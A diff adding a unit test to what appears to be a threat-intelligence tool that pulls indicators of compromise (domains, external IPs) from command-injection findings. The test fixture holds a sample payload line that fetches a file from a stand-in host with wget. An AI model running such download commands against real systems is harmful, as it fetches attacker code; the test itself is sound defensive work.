@@ -217,3 +217,30 @@ def test_collect_iocs_dedup():
     ]
     iocs = collect_iocs_from_findings(findings)
     assert iocs.count(("ip", "8.8.8.8")) == 1
+
+
+def test_collect_iocs_from_payload_text():
+    """Домены и внешние IP из тела становятся кандидатами обогащения."""
+    import base64
+
+    text = b"wget http://payload.example/a 203.0.113.9 10.0.0.5"
+    findings = [{
+        "type": "command_injection",
+        "value": "x",
+        "severity": "high",
+        "evidence": {
+            "payload_samples": [{
+                "is_text": True,
+                "text_b64": base64.b64encode(text).decode("ascii"),
+            }],
+        },
+    }]
+
+    iocs = collect_iocs_from_findings(findings)
+
+    assert ("domain", "payload.example") in iocs
+    assert ("ip", "203.0.113.9") in iocs
+    assert ("ip", "10.0.0.5") not in iocs
+    assert collect_iocs_from_findings(
+        findings, include_payload=False,
+    ) == []
